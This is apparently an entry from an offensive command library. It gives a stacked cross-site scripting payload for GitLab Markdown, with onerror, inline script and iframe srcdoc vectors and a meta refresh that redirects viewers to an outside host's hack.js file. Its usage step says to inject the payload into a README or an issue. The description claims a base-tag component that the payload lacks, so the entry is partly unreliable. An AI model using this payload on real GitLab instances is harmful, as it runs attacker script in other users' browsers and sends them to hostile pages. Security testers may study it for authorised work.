---
data: >-
  <pre data-sourcepos="\"%22 href=\"x\"></pre><img src=#
  onerror=alert(1)><script>alert(2)</script><iframe
  srcdoc='<script>alert(3)</script>'/><meta http-equiv=refresh
  content='5;https://joaxcar.com/hack.js'><pre x=\"\"><code></code></pre>
tags:
  - xss
  - testing
type: command
output: 'Multiple alerts (1,2,3) and redirect after 5s'
executor: html
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-13T23:56:19.800Z'
id: e15f31cc-5676-4a65-8c79-20db82c85c24
verified: false
validated: true
submitted: true
---
# test-multiple-xss-vectors

## Command

```html
<pre data-sourcepos="\"%22 href=\"x\"></pre><img src=# onerror=alert(1)><script>alert(2)</script><iframe srcdoc='<script>alert(3)</script>'/><meta http-equiv=refresh content='5;https://joaxcar.com/hack.js'><pre x=\"\"><code></code></pre>
```

## Description

Tests various XSS vectors in GitLab Markdown, including onerror, inline script, iframe srcdoc, and meta refresh, combined with base tag for comprehensive bypass testing on self-hosted or vulnerable instances.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| domain | Redirect target | Yes |

## Examples

### Basic Usage

Inject into README.md or issue.

### Advanced Usage

Omit base for direct tests.

## Expected Output

Alerts for 1,2,3; page redirects to hack.js after 5 seconds.

## Related

- [[commands/inject-base-tag-payload]]
- [[procedures/Inject-XSS-Payload-into-Issue-Description]]
